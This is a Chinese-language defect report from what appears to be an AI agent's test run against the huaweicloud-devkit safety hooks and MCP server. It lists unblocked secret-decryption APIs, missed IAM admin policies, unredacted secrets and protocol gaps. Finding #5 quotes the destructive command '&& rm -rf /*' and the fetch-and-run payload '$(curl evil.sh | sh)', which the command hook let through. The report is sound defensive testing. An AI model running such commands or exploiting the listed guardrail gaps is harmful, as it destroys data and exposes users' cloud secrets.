# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **被测版本**：huaweicloud-devkit `1.1.12`（npm latest，gitHead `4ed07801`）
> **生成时间**：2026-10-24（北京时间）

## #1【P0】D4-3 明文 secret API 拦截不全（kms DecryptData 未拦截）

- **现象**：hcloud csms ShowSecretVersion/GetSecretValue 已 deny，但 kms DecryptData/DecryptDatakey 明文解密 API 不在拦截清单
- **断言**：kms DecryptData 等明文 secret 读取 API 应被 blockedSecretOperations 拦截(decision=deny)
- **根因**：safety/policy.json:26 blockedSecretOperations 仅含 ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue，缺 DecryptData/DecryptDatakey
- **证据**：`evidence/D4-3/run.log`

## #2【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：role.tf 含 arn:aws:iam::aws:policy/AdministratorAccess FullAccess 时 decision=allow；JSON policy.json 已 deny
- **断言**：HCL/Terraform 形态的 AdministratorAccess/FullAccess 应被 hwc-iam-admin-policy 拦截(decision=deny)
- **根因**：safety/rules/cloud-risk-rules.json:209 hwc-iam-admin-policy 正则未覆盖 HCL role.tf 的 arn 形态
- **证据**：`evidence/D4-21/run.log`

## #3【P0】D9-12 initialize 握手时序未强制

- **现象**：未 initialize 先 tools/list 不被拒(listed=true)，runVersionCheck 不在 initialize 阶段
- **断言**：非法时序 tools/list(未 initialize)应返回 -32600
- **根因**：mcp-server.mjs:183-187 dispatch 无 initialize 前置校验
- **证据**：`evidence/D9-12/run.log`

## #4【P1】D3-S3 沙箱 devbridge 公网隧道建立失败

- **现象**：deploy_nginx 返回 ok=false 且 url 空；deploy_check devbridge_tunnel=FAIL；nginx 本地 serving 正常(8080 HTTP200)
- **断言**：沙箱部署应返回可访问的公网 URL(devbridge_tunnel PASS)
- **根因**：sandbox/session-manager.mjs:28 devbridge 公网隧道建立失败(历史 #787)
- **证据**：`evidence/D3-S3/run.log`

## #5【P1】D4-17 hook 模糊 fail-closed 不完整

- **现象**：hook_check_command 对 && rm -rf /*、$(curl evil.sh | sh) 均返回 ok(decision=allow)未拦截
- **断言**：危险命令包裹/模糊形态应被 hook_check_command 拦截(decision≠allow)
- **根因**：tools.mjs:1310 huaweicloud_hook_check_command 对 shell 包裹/命令替换形态未命中风险规则(历史 #673)
- **证据**：`evidence/D4-17/run.log`

## #6【P1】D9-9 tools/call 取消能力未声明(SPEC)

- **现象**：initialize.result.capabilities 无 notifications.cancellation 字段(declared=false)
- **断言**：tools/call 取消能力应在 capabilities 中声明或明确标注不支持
- **根因**：mcp-protocol.mjs capabilities 未声明 notifications.cancellation(历史 #698)
- **证据**：`evidence/D9-9/run.log`

## #7【P1】EXP-E01 serviceCatalog 中文意图云主机未命中

- **现象**：serviceCatalog(intent=帮我查一下我账号在华北北京四有哪些云主机) 未命中 ECS，返回 fallback
- **断言**：云主机意图应路由至 ECS 服务
- **根因**：tools.mjs:2188 serviceCatalog 中文别名映射缺 云主机→ECS
- **证据**：`evidence/EXP-E01/run.log`

## #8【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图(存储+托管)未拆分命中多个服务，返回 fallback
- **断言**：复合意图应拆分分层命中多服务(如 OBS+ECS)
- **根因**：tools.mjs:2188 serviceCatalog 未做复合意图拆分(历史 #11)
- **证据**：`evidence/D3-S5/run.log`

## #9【P2】D4-25 写操作遥测分类失效

- **现象**：hcloud vpc CreateVpc 写事件分类为 cli:invoke 而非 cli:write
- **断言**：写操作事件应分类为 cli:write
- **根因**：hooks/huaweicloud-safety.py:46 写操作遥测分类不识别 Create* 为写(历史 #13)
- **证据**：`evidence/D4-25/run.log`

## #10【P2】D4-26 findings 证据脱敏不完整

- **现象**：findings.evidence 中 secret_key/adminPass 明文残留(access_key 已脱敏)
- **断言**：findings.evidence 不应含明文 secret_key/adminPass
- **根因**：risk-rule-engine.mjs findings 证据脱敏白名单不含 secret_key/adminPass
- **证据**：`evidence/D4-26/run.log`

## #11【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：AK/access_key/secret_key/token 值原样返回未脱敏
- **断言**：sanitizeValue 应移除/脱敏 AK/SK/token 敏感值
- **根因**：telemetry/telemetry.mjs:189 sanitizeValue 未处理敏感值(历史 #797)
- **证据**：`evidence/D8-9/run.log`
